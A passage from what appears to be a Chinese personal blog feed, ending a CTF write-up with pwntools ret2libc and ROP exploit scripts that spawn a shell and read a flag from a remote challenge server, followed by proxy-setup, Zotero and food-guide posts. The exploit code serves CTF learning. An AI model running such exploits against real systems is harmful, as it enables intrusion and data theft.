class="hljs-number">08048460</span>                 jmp     ds:off_804A018 # 这个地址第一次不会被解析<br>.plt:<span class="hljs-number">08048460</span> _puts           endp<br>.plt:<span class="hljs-number">08048460</span><br>.plt:<span class="hljs-number">08048466</span> ; ---------------------------------------------------------------------------<br>.plt:<span class="hljs-number">08048466</span>                 push    <span class="hljs-number">18</span>h<br>.plt:<span class="hljs-number">0804846B</span>                 jmp     sub_8048420<br>    <br># sub_8048420    <br><br>.plt:<span class="hljs-number">08048420</span>                 push    ds:dword_804A004<br>.plt:<span class="hljs-number">08048426</span>                 jmp     ds:dword_804A008<br>    <br>.got.plt:<span class="hljs-number">0804</span>A004 dword_804A004   dd <span class="hljs-number">0</span>                    ; DATA XREF: sub_8048420↑r<br>.got.plt:<span class="hljs-number">0804</span>A008 dword_804A008   dd <span class="hljs-number">0</span>                    ; DATA XREF: sub_8048420+<span class="hljs-number">6</span>↑r<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303251612518.png"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>与上道题不同的是，这道题没有system函数，也没有/bin/sh字符串，因此我们需要得到libc的地址，并在libc中找到system和sh字符串</p><p>分析：</p><ul><li>利用got表泄露，得到puts函数的地址</li><li>由于libc内的函数最低12位不随着libc库版本的改变而改变，因此只要得到puts函数的地址，就可以得到libc的版本</li><li>由于libc内的函数的相对偏移不随着libc库版本的改变而改变，因此只要得到puts函数的地址，就可以得到其余函数的地址（比如system函数、sh字符串）</li></ul><p>利用<a href="https://github.com/lieanu/LibcSearcher">LibcSearcher</a>，可以很方便的达到目的</p><p>程序开始执行，在遇到gets函数的时候，我们需要修改返回地址使得可以返回到main函数，同时调用puts函数，且将puts_got的值输出，从而得到libc版本</p><p>在得到puts_got之后，返回到main执行，这时候会再次回到gets函数的所在位置，我们需要观察栈帧，得到造成缓冲区溢出的偏移</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303252330297.png"></p><p>第一次的偏移好算，直接gdb到gets的调用即可，为112，但是第二次比较麻烦，我们需要在使用pwntools的同时进行gdb调试。注意调试的时候在py文件中gdb.attach(sh)的位置要放对</p><p>可以看到下面第二次调用gets函数时的堆栈值</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303252330868.png"></p><p>这里遇到了报错：LibcSearcher找不到合适libc，需要更新一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd LibcSearcher<br>rm -rf libc-database/ # 删掉旧的<br>git clone https://github.com/niklasb/libc-database<br>cd libc-database<br>./get # 获取新的<br></code></pre></td></tr></table></figure><p>注意到如果想在pwntools中使用tmux的话，需要先在命令行输入tmux，等进入tmux中再输入payload.py</p><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> * <br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>sh = process(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><span class="hljs-comment"># 0xffffd308-0xffffd280-0x1c+4=112</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">112</span>) + p32(puts_plt) + p32(main) + p32(puts_got)<br><br>gdb.attach(sh) <br><br>sh.sendlineafter(<span class="hljs-string">&quot;Can you find it !?&quot;</span>, payload)<br><br>puts_addr = u32(sh.recv(<span class="hljs-number">4</span>)) <span class="hljs-comment">#  get puts addr</span><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>, puts_addr) <span class="hljs-comment">#  search libc</span><br><br>libc_base = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>) <span class="hljs-comment">#  get libc base</span><br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>) <span class="hljs-comment">#  get system addr</span><br>binsh_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>) <span class="hljs-comment">#  get /bin/sh addr</span><br><br><span class="hljs-comment">#gdb.attach(sh)</span><br><span class="hljs-comment">#104 is offset and is hard to get </span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">104</span>) + p32(system_addr) + p32(<span class="hljs-number">0xaaaa</span>) + p32(binsh_addr)<br>sh.sendlineafter(<span class="hljs-string">&quot;Can you find it !?&quot;</span>, payload)<br><br>sh.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#p = process(&#x27;./rop&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;124.16.75.116&#x27;</span>,<span class="hljs-number">52017</span>)<br><br>elf=ELF(<span class="hljs-string">&#x27;./rop&#x27;</span>)<br>bss=<span class="hljs-number">0x404130</span><br>puts_plt=<span class="hljs-number">0x4010d0</span><br>read_plt=<span class="hljs-number">0x401100</span> <span class="hljs-comment">#elf.plt[&#x27;read&#x27;]</span><br>sys_open=<span class="hljs-number">0x4012c9</span><br><span class="hljs-comment">#ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;rdi&#x27;</span><br><span class="hljs-comment">#0x0000000000401503 : pop rdi ; ret</span><br><span class="hljs-comment">#0x0000000000401501 : pop rsi ; pop r15 ; ret</span><br><span class="hljs-comment">#0x000000000040101a : ret</span><br><span class="hljs-comment">#flag</span><br><br><span class="hljs-comment">#flag&#123;8ac4f835-a613-46ff-8c86-4c2428c24982&#125;</span><br>pop_rdi=<span class="hljs-number">0x0000000000401503</span><br>pop_rsi=<span class="hljs-number">0x0000000000401501</span><br>vul=<span class="hljs-number">0x401384</span><br>ret=<span class="hljs-number">0x000000000040101a</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;your choice:&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;4919&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(bss))<br><span class="hljs-comment">#read(0,bss,0x100) 把./flag字符串读到bss：0x404130；使用open打开bss中的字符串，即打开./flag文件；read读取flag文件内容到bss+0x20处，使用write输出bss+0x20处的内容，即输出flag文件内容；</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>+p64(<span class="hljs-number">0</span>)+p64(ret)<br>payload+=p64(pop_rdi)+p64(<span class="hljs-number">0</span>)+p64(pop_rsi)+p64(bss)+p64(<span class="hljs-number">0</span>)+p64(read_plt) <span class="hljs-comment"># rdi = 0 , rsi = bss_addr , read(0,addr,?)</span><br><br>payload+=p64(vul)<br><br>p.send(payload)<br><br>p.send(<span class="hljs-string">&#x27;./flag&#x27;</span>) <span class="hljs-comment"># read: &#x27;./flag&#x27; to bss_addr</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>+p64(<span class="hljs-number">0</span>)+p64(ret)<br>payload+=p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(sys_open)+p64(vul) <span class="hljs-comment"># open flag file </span><br><br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br><br>p.send(payload)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>+p64(<span class="hljs-number">0</span>)+p64(ret)<br>payload+=p64(pop_rdi)+p64(<span class="hljs-number">3</span>)+p64(pop_rsi)+p64(bss+<span class="hljs-number">0x20</span>)+p64(<span class="hljs-number">0</span>)+p64(read_plt) <span class="hljs-comment"># read flag content to bss+0x20</span><br>payload+=p64(vul)<br><br><br>p.send(payload)<br>time.sleep(<span class="hljs-number">1</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>+p64(<span class="hljs-number">0</span>)+p64(ret)<br>payload+=p64(pop_rdi)+p64(bss+<span class="hljs-number">0x20</span>)+p64(puts_plt)<br>p.send(payload)<br><br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><p><a href="https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#inspecting-the-stack">https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#inspecting-the-stack</a>    </p></li><li><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/</a></p></li><li><p><a href="https://hitcxy.com/2020/plt-got/">https://hitcxy.com/2020/plt-got/</a></p></li><li><p><a href="https://hitcxy.com/2020/ret2libc3/">https://hitcxy.com/2020/ret2libc3/</a></p></li><li><p><a href="https://blog.csdn.net/weixin_44681716/article/details/89877497">https://blog.csdn.net/weixin_44681716/article/details/89877497</a></p></li><li><p><a href="https://paper.seebug.org/papers/scz/unix/201606171028.txt">https://paper.seebug.org/papers/scz/unix/201606171028.txt</a> IDA分析GOT/PLT时的坑</p></li><li><p><a href="https://blog.csdn.net/Zheng__Huang/article/details/119484353">https://blog.csdn.net/Zheng__Huang/article/details/119484353</a></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>使用traojan-go和proxychans实现服务器代理</title>
    <link href="/p/842b507e/"/>
    <url>/p/842b507e/</url>
    
    <content type="html"><![CDATA[<h1 id="为什么使用这种方案"><a href="#为什么使用这种方案" class="headerlink" title="为什么使用这种方案"></a>为什么使用这种方案</h1><ul><li><p>Trojan的好处</p><ul><li>Trojan不使用自定义的加密协议来隐藏自身，而是使用特征明显的TLS协议(TLS/SSL)，使得流量看起来与正常的HTTPS网站相同。也就是说，如果别的梯子是加密（让别人看不出你的流量内容），那么Trojan就是伪装（看起来和普通的HTTPS流量一样）</li><li>对于被动检测，Trojan协议的流量与HTTPS流量的特征和行为完全一致。而HTTPS流量占据了目前互联网流量的一半以上，且TLS握手成功后流量均为密文，几乎不存在可行方法从其中分辨出Trojan协议流量。</li></ul></li><li><p>proxychains的好处</p><ul><li>proxychains可以指定一些shell命令是否走代理。一般情况下运行代理后会把HTTPS的代理服务器以环境变量的形式写到系统配置文件中，但是这样的话无法对所有的命令行命令进行代理，比如ssh、git等命令可能会无法使用代理。安装了proxychains之后就可以使用<code>proxychains git clone xxx</code>指定git命令走代理</li><li>要注意到proxychains只能允许tcp和dns协议通过代理隧道，因此ping命令作为不使用应用层协议而是直接使用ip协议的命令，使用proxychains是无效的</li></ul></li></ul><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown">About proxychains tool:<br><span class="hljs-bullet">   *</span> It&#x27;s a proxifier.<br><span class="hljs-bullet">   *</span> Latest version: 3.1<br><span class="hljs-bullet">   *</span> Dedicated OS: Linux and other Unices.<br><span class="hljs-bullet">   *</span> Allows TCP and DNS tunneling through proxies.<br><span class="hljs-bullet">   *</span> Supports HTTP, SOCKS4 and SOCKS5 proxy servers.<br><span class="hljs-bullet">   *</span> Different proxy types can be mixed in the same chain.<br><span class="hljs-bullet">   *</span> Proxy chain: user-defined list of proxies chained together.<br>  Usability :<br><span class="hljs-bullet">      *</span> Run any program through proxy server.<br><span class="hljs-bullet">      *</span> Access the Internet from behind a restrictive firewall.<br><span class="hljs-bullet">      *</span> Hide your IP<br><span class="hljs-bullet">      *</span> Run SSH, telnet, wget, ftp, apt, vnc, nmap through proxy servers.<br><span class="hljs-bullet">      *</span> Access Intranets (192.168.<span class="hljs-emphasis">*.*</span>/10.<span class="hljs-emphasis">*.*</span>.<span class="hljs-emphasis">*) from outside through reverse proxy.</span><br></code></pre></td></tr></table></figure><h1 id="tldr"><a href="#tldr" class="headerlink" title="tldr"></a>tldr</h1><blockquote><p>太长不看版本</p></blockquote><p><strong>安装Trojan</strong></p><p>下载Trojan zip文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/p4gefau1t/</span>trojan-go<span class="hljs-regexp">/releases/</span>download<span class="hljs-regexp">/v0.10.6/</span>trojan-go-linux-amd64.zip<br></code></pre></td></tr></table></figure><p>解压：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">mkdir</span> trojan-<span class="hljs-built_in">go</span><br><br>unzip *.zip -d trojan-<span class="hljs-built_in">go</span><br></code></pre></td></tr></table></figure><p>编辑yaml文件：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> trojan-<span class="hljs-keyword">go</span>/ &amp;&amp; <span class="hljs-keyword">vim</span> japan.yaml<br></code></pre></td></tr></table></figure><p>编辑proxychains的conf文件，按照文件中的注释去增加规则（协议、ip、端口）：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>proxychains4.conf<br></code></pre></td></tr></table></figure><p>将Trojan-go程序按照yaml配置运行：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./trojan-go</span> <span class="hljs-params">--config</span> japan.yaml<br></code></pre></td></tr></table></figure><p>下面将Trojan-go程序配置为开机自启动的系统服务：</p><p>编辑Trojan-go.service文件，复制</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">vim</span> ./trojan-<span class="hljs-keyword">go</span>.service<br><br><span class="hljs-keyword">cp</span> ./trojan-<span class="hljs-keyword">go</span>.service /etc/systemd/<span class="hljs-built_in">system</span>/<br></code></pre></td></tr></table></figure><p>开启服务：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs smali">sudo<span class="hljs-keyword"> system</span>ctl enable trojan-go<br>sudo<span class="hljs-keyword"> system</span>ctl start trojan-go<br>sudo<span class="hljs-keyword"> system</span>ctl daemon-reload<br></code></pre></td></tr></table></figure><p>检测Trojan服务的状态：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">sudo systemctl <span class="hljs-built_in">status</span> trojan-<span class="hljs-built_in">go</span><br></code></pre></td></tr></table></figure><p>检测ip</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">proxychains4 curl myip.ipip.<span class="hljs-built_in">net</span><br></code></pre></td></tr></table></figure><p><strong>安装proxychains</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo apt install proxychains4<br>sudo vim <span class="hljs-regexp">/etc/</span>proxychains4.conf <span class="hljs-comment"># 在最后一行按照格式写入ip与端口</span><br></code></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://trojan-gfw.github.io/trojan/">https://trojan-gfw.github.io/trojan/</a></li><li><a href="https://github.com/p4gefau1t/trojan-go">https://github.com/p4gefau1t/trojan-go</a></li><li><a href="http://proxychains.net/">http://proxychains.net/</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>使用zotero高效管理文献</title>
    <link href="/p/8726c56d/"/>
    <url>/p/8726c56d/</url>
    
    <content type="html"><![CDATA[<p><img src="https://img.gls.show/img/20230803194639.png"></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>zotero是一个优秀的科研文献管理工具。它开源、免费、跨平台，适配了Windows、macos、Linux。在可以对文献进行高效操作的同时，支持通过使用浏览器插件对网页进行收录操作</p><p>简单总结一下zotero：</p><ul><li>提供文献的高效化分类整理</li><li>支持翻译功能</li><li>支持markdown语法的笔记功能</li><li>支持</li></ul><p>在zotero的官网上，有这样一篇文章：<a href="https://www.zotero.org/why">Why Zotero?</a>，讲述了为什么使用zotero</p><p>下载并安装zotero：<a href="https://www.zotero.org/">https://www.zotero.org/</a></p><h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><h2 id="导入文献"><a href="#导入文献" class="headerlink" title="导入文献"></a>导入文献</h2><p><strong>条码导入</strong></p><p><img src="https://img.gls.show/img/20230801101150.png"></p><p>支持输入ISBN、DOI、PMID、arXiv ID 或 ADS 条码来添加条目到您的文库，并且支持多行导入</p><p><strong>直接拖动文件导入</strong></p><p>把本地pdf文件拖进去即可</p><p><strong>使用浏览器插件导入</strong></p><p>安装浏览器插件zotero connector，可以将网页内容保存到zotero中</p><h2 id="复制文献信息"><a href="#复制文献信息" class="headerlink" title="复制文献信息"></a>复制文献信息</h2><p>在zotero中选中条目，c+shift+c即可</p><p>复制效果：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">Dietrich, Constanze, Katharina Krombholz, Kevin Borgolte和Tobias Fiebig. 《Investigating System Operators’ Perspective on Security Misconfigurations》. 收入 _Proceedings of the <span class="hljs-number">2018</span> ACM SIGSAC Conference on Computer and Communications Security_, <span class="hljs-number">1272</span>–<span class="hljs-number">89</span>. Toronto Canada: ACM, <span class="hljs-number">2018</span>. [https:<span class="hljs-regexp">//</span>doi.org<span class="hljs-regexp">/10.1145/</span><span class="hljs-number">3243734.3243794</span>](https:<span class="hljs-regexp">//</span>doi.org<span class="hljs-regexp">/10.1145/</span><span class="hljs-number">3243734.3243794</span>).<br></code></pre></td></tr></table></figure><h2 id="同步功能"><a href="#同步功能" class="headerlink" title="同步功能"></a>同步功能</h2><p>在zotero官网上注册账号，在软件菜单栏-》首选项-》同步处登录账号，即可实现多设备同步</p><p>不同账号可以使用Zotero群组功能，开一个共享文献库，这样彼此读过的文献、作出的批注，也都可以共享</p><p>Zotero的群组功能的使用教程：<a href="https://zhuanlan.zhihu.com/p/348626383">https://zhuanlan.zhihu.com/p/348626383</a></p><h2 id="在大目录显示所有文章（包括小目录的文章）"><a href="#在大目录显示所有文章（包括小目录的文章）" class="headerlink" title="在大目录显示所有文章（包括小目录的文章）"></a>在大目录显示所有文章（包括小目录的文章）</h2><p>菜单-》查看-》勾选“显示子分类中的条目”</p><h2 id="文章重要性标记"><a href="#文章重要性标记" class="headerlink" title="文章重要性标记"></a>文章重要性标记</h2><p>有一个很简单的方法对文章重要性进行排序，就是在论文标题列旁边显示版权信息即可，然后手动给论文的版权信息那一栏加上标记，比如<code>###</code>为重要，<code>##</code>为次要，<code>#</code>为一般，不加标记为不重要</p><h1 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>打开工具-》附加组件，安装插件</p><ul><li>Zotero Connector，打通和浏览器的屏障<ul><li><a href="https://www.zotero.org/download/connectors">https://www.zotero.org/download/connectors</a></li></ul></li><li>对参考文献进行高效管理<ul><li><a href="https://github.com/MuiseDestiny/zotero-reference/">https://github.com/MuiseDestiny/zotero-reference/</a></li></ul></li><li>翻译功能<ul><li><a href="https://github.com/windingwind/zotero-pdf-translate/releases">https://github.com/windingwind/zotero-pdf-translate/releases</a></li></ul></li></ul><h2 id="翻译功能"><a href="#翻译功能" class="headerlink" title="翻译功能"></a>翻译功能</h2><p><a href="https://github.com/windingwind/zotero-pdf-translate">GitHub - windingwind/zotero-pdf-translate: Translate PDF, EPub, webpage, metadata, annotations, notes to the target language. Support 20+ translate services.</a></p><p>支持多种翻译引擎，比如cnki、google、deep L、彩云小译、GPT等（可导入api）</p><p>以彩云小译翻译api为例：</p><ul><li>在<a href="https://platform.caiyunapp.com/login">彩云开放平台</a>注册并登录</li><li>打开应用管理-》创建应用-》翻译</li></ul><h2 id="记录笔记"><a href="#记录笔记" class="headerlink" title="记录笔记"></a>记录笔记</h2><p>zotero自带笔记功能的加强版</p><p><a href="https://github.com/windingwind/zotero-better-notes">GitHub - windingwind/zotero-better-notes: Everything about note management. All in Zotero.</a></p><h2 id="超链接快速跳转到zotero"><a href="#超链接快速跳转到zotero" class="headerlink" title="超链接快速跳转到zotero"></a>超链接快速跳转到zotero</h2><p>zutilo支持通过超链接从别的软件，比如typora，导航到zotero文献的具体位置</p><p><a href="https://blog.csdn.net/magefreehome/article/details/118051991">Zutilo的高级扩展使用 Quick Copy alt1 alt2-CSDN博客</a></p><p><a href="https://qnscholar.github.io/2020-10/zotero-item-links/">牛叉！Zutilo插件的这个功能，究竟有多好用！</a></p><h2 id="论文重命名"><a href="#论文重命名" class="headerlink" title="论文重命名"></a>论文重命名</h2><p>很多时候下载下来的论文名字是混乱的，可以使用<a href="https://github.com/jlegewie/zotfile">GitHub - jlegewie/zotfile: Zotero plugin to manage your attachments: automatically rename, move, and attach PDFs (or other files) to Zotero items, sync PDFs from your Zotero library to your (mobile) PDF reader (e.g. an iPad, Android tablet, etc.), and extract PDF annotations.</a>自动的对文献进行重命名</p><h1 id="中文文献支持"><a href="#中文文献支持" class="headerlink" title="中文文献支持"></a>中文文献支持</h1><p><a href="https://github.com/l0o0/jasminum">GitHub - l0o0/jasminum: A Zotero add-on to retrive CNKI meta data. 一个简单的Zotero 插件，用于识别中文元数据</a></p><p>中文期刊附件（PDF/CAJ）的元数据抓取，支持添加PDF/CAJ时自动抓取元数据功能</p><h1 id="添加引用"><a href="#添加引用" class="headerlink" title="添加引用"></a>添加引用</h1><p>//todo</p><h1 id="使用坚果云对zotero进行同步"><a href="#使用坚果云对zotero进行同步" class="headerlink" title="使用坚果云对zotero进行同步"></a>使用坚果云对zotero进行同步</h1><p>zotero自带的云存储只有300MB，坚果云则是上传1GB，下载3GB，且支持webdav</p><p>同步方法：</p><ul><li>zotero中，编辑-》首选项-》同步-》登录zotero的账号</li><li>之后下面会出现文件同步方式，选择webdav</li><li><strong>注意下方的密码不是坚果云的密码</strong>。需要注册坚果云账号， 在坚果云网页端依次选择：账号名称——账户信息——安全选项——第三方应用管理——添加应用密码，给zotero生成一个密码</li></ul><p><img src="https://img.gls.show/img/202312161603328.png"></p><h1 id="zotero的群组功能"><a href="#zotero的群组功能" class="headerlink" title="zotero的群组功能"></a>zotero的群组功能</h1><p><a href="https://www.jianshu.com/p/187cbeea19af">Zotero使用指南04：群组功能 - 简书</a></p><p><a href="https://zhuanlan.zhihu.com/p/161243372">文献共享/协同研究，不妨试试Zotero群组？ - 知乎</a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://sspai.com/post/56724">Zotero 的使用和学习路径</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>树村路19号不完全挂逼指南</title>
    <link href="/p/de638251/"/>
    <url>/p/de638251/</url>
    
    <content type="html"><![CDATA[<p>👴💊💰🧣7⃣🍜🌶，iie🔥⏩👊💰❕😅</p><span id="more"></span><h1 id="欢迎来到树村路19号"><a href="#欢迎来到树村路19号" class="headerlink" title="欢迎来到树村路19号"></a>欢迎来到树村路19号</h1><p><img src="https://img.gls.show/img/shucun-road.jpg"></p><p><del>愿圣工所的光辉与你同在</del></p><h1 id="挂逼是什么意思？"><a href="#挂逼是什么意思？" class="headerlink" title="挂逼是什么意思？"></a>挂逼是什么意思？</h1><blockquote><p>在深圳龙华三和人力市场，有这样一群人，他们只做日结工作，吃着五元一碗的“挂逼面”，喝着两元一大瓶的“挂逼水”，干一天日结，玩三天，游离在网吧和集体宿舍乃至大街，这样的一群人，被人们亲切地称为“三和大神”。</p></blockquote><blockquote><p>在三和大神群体中，“挂逼”一词是经常被挂在嘴边的。三和青年们经常去吃的面因为五元一碗经济实惠，被称为挂逼面；二元一大瓶的纯净水被称之为挂逼水，“挂逼”一词既是一种贬义，更多的还是一种自嘲。</p></blockquote><p>三和大神群体所影射的躺平主义等社会思潮暂且不表，本文仅讨论如何在北五环这寸土寸金的地方——中国科学院信息工程研究所（树村路19号），吃的更好（<del>正确的挂逼</del>）</p><p><img src="https://img.gls.show/img/20230912153023.png"></p><p><img src="https://img.gls.show/img/20230912153036.png"></p><p>相关阅读：</p><ul><li><a href="https://zh.wikipedia.org/wiki/%E4%B8%89%E5%92%8C%E5%A4%A7%E7%A5%9E">三和大神 - 维基百科，自由的百科全书</a></li><li><a href="https://www.youtube.com/watch?v=YcidornQ7rU">[NHK][纪录片][中文字幕] 三和人才市场・中国日结百元的青年们 - YouTube</a></li></ul><h1 id="挂逼姿势，一点来自长者的人生经验【持续更新中】"><a href="#挂逼姿势，一点来自长者的人生经验【持续更新中】" class="headerlink" title="挂逼姿势，一点来自长者的人生经验【持续更新中】"></a>挂逼姿势，一点来自长者的人生经验【持续更新中】</h1><p>一点来自长者的人生经验：如何吃的最便宜以及最好</p><blockquote><p>在本章节的最开始，严重声明，没有收任何广告费，一切都是探店得出的羊毛（挂逼）攻略。借用某位高人的名言：我今天是作为一个长者给你们讲的，我不是新闻工作者，但是我见得太多了，我有這个必要告诉你们一点人生的经验</p></blockquote><h1 id="海底捞"><a href="#海底捞" class="headerlink" title="海底捞"></a>海底捞</h1><p>海底捞服务、味道都没话说，就是有些太贵了</p><p>这里提供一个人均45+块钱吃撑的吃法（只比点外卖多花二十块钱，从来没发现海底捞这么划算过 :) 